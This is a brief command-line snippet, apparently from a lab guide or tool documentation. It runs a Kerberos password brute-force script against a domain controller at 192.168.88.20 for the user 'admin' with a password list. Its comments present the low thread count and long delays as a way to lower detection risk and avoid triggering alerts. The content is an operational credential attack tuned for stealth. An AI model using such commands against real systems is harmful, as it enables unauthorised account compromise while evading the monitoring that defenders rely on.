# Lower detection risk with longer delays and fewer threads
python3 kerb_bruteforce_advanced.py \
    -r LAB.LOCAL \
    -k 192.168.88.20 \
    -u admin \
    -p passwords.txt \
    -t 2 \
    -d 5.0 \
    --smart

# Rate: ~0.4 attempts/second
# Takes longer but less likely to trigger alerts
